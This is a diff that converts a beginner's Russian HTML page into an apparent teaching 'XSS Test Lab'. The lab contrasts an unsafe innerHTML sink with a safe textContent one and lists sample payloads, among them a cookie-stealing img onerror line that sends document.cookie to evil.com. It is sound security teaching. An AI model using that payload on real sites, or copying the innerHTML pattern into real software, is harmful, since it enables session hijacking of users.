@@ -2,43 +2,159 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Мой сайт</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Test Lab</title>
 
 <style>
-
 body{
     background:#1f1f1f;
     color:white;
     font-family:Arial;
     text-align:center;
-    margin-top:100px;
+    margin-top:50px;
+    padding:20px;
 }
 
 button{
     padding:12px 25px;
-    font-size:20px;
+    font-size:18px;
     border:none;
     border-radius:10px;
     cursor:pointer;
+    margin:5px;
 }
 
+input, textarea{
+    padding:12px 15px;
+    font-size:18px;
+    border:none;
+    border-radius:10px;
+    outline:none;
+    margin:10px 0;
+    width:300px;
+    font-family:Arial;
+}
+
+textarea{
+    width:80%;
+    max-width:600px;
+    height:80px;
+    resize:vertical;
+}
+
+.btn-vuln{
+    background:#c0392b;
+    color:white;
+}
+.btn-safe{
+    background:#27ae60;
+    color:white;
+}
+
+.box{
+    background:#2c2c2c;
+    border-radius:10px;
+    padding:15px;
+    margin:15px auto;
+    max-width:700px;
+    min-height:40px;
+    text-align:left;
+    word-wrap:break-word;
+}
+
+.box-vuln{
+    border:2px solid #c0392b;
+}
+.box-safe{
+    border:2px solid #27ae60;
+}
+
+h2{
+    margin-top:30px;
+}
+
+.warning{
+    color:#e67e22;
+    font-size:14px;
+    max-width:700px;
+    margin:10px auto;
+}
+
+img{
+    max-width:100%;
+    height:auto;
+}
+
+max-width:768px {
+    body{ margin-top:20px; }
+    input, textarea{ width:90%; }
+}
 </style>
 
 </head>
-
 <body>
 
-<h1>Добро пожаловать!</h1>
+<h1>🧪 XSS Test Lab</h1>
+<p>Введи свой payload и посмотри, как он обрабатывается:</p>
 
-<p>Это мой первый сайт.</p>
+<textarea id="xssInput" placeholder="Например: <img src=x onerror=alert('XSS!')>"></textarea>
 
-<button onclick="alert('Привет я сделал кнопку!')">кнопка1</button>
-<button onclick="alert('это классная функция которую создал я')">кнопка2</button>
+<button class="btn-vuln" onclick="renderUnsafe()">⚠️ Уязвимый вывод (innerHTML)</button>
+<button class="btn-safe" onclick="renderSafe()">✅ Безопасный вывод (textContent)</button>
+<button onclick="clearAll()">🧹 Очистить</button>
 
-    <h1>Привет, меня зовут Александр!!!</h1>
+<h2>🔴 Уязвимый вариант</h2>
+<p class="warning">Здесь HTML-код выполняется напрямую — XSS работает!</p>
+<div id="unsafeBox" class="box box-vuln"></div>
 
-<p>Я учусь создавать сайты.</p>
-<p><img src="img/foto2.jpg" alt="картинка не выдалась"></p>
+<h2>🟢 Безопасный вариант</h2>
+<p class="warning">Здесь HTML экранируется — XSS не работает.</p>
+<div id="safeBox" class="box box-safe"></div>
+
+<hr style="margin:40px 0; border-color:#444;">
+
+<h2>📚 Примеры payload'ов для проверки</h2>
+<div class="box">
+    <p><b>1. Классический алерт:</b></p>
+    <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+    <p><b>2. SVG-вектор:</b></p>
+    <code>&lt;svg onload=alert(1)&gt;</code>
+    <p><b>3. Тег script (сработает только через iframe или при вставке при загрузке):</b></p>
+    <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+    <p><b>4. body onload:</b></p>
+    <code>&lt;body onload=alert(1)&gt;</code>
+    <p><b>5. Кража cookie (демо, не выполнять на реальных сайтах!):</b></p>
+    <code>&lt;img src=x onerror="document.location='http://evil.com/?c='+document.cookie"&gt;</code>
+</div>
+
+<script>
+// ⚠️ УЯЗВИМЫЙ вариант — использование innerHTML
+// Здесь HTML-код вставляется и выполняется браузером
+function renderUnsafe() {
+    let payload = document.getElementById("xssInput").value;
+    document.getElementById("unsafeBox").innerHTML = payload;
+}
+
+// ✅ БЕЗОПАСНЫЙ вариант — использование textContent
+// HTML воспринимается как обычный текст, не выполняется
+function renderSafe() {
+    let payload = document.getElementById("xssInput").value;
+    document.getElementById("safeBox").textContent = payload;
+}
+
+function clearAll() {
+    document.getElementById("xssInput").value = "";
+    document.getElementById("unsafeBox").innerHTML = "";
+    document.getElementById("safeBox").innerHTML = "";
+}
+
+// Отправка по Ctrl+Enter на уязвимый вариант
+document.getElementById("xssInput").addEventListener("keydown", function(e) {
+    if (e.ctrlKey && e.key === "Enter") {
+        renderUnsafe();
+    }
+});
+</script>
 
 </body>
 </html>
